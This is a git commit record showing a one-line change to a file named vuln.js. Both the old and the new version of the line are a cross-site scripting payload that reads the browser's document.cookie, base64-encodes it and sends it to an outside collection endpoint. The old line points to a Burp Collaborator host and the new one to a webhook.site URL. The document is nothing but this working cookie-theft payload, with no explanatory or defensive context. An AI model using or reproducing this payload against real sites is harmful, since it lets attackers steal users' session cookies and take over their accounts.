acab263419eead5aa5d651ca647ab169ecec0341
Chinh Do <89497629+Chid0k@users.noreply.github.com>
2025-08-03 20:21:55 +0700

    vuln.js

--- vuln.js
+++ vuln.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'http://jcz3f5p2jzln482wbw8f3mqxqowfk78w.oastify.com?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/d81f39b8-ab0d-4f78-b5a2-591415dd5155?data='+btoa(document.cookie);
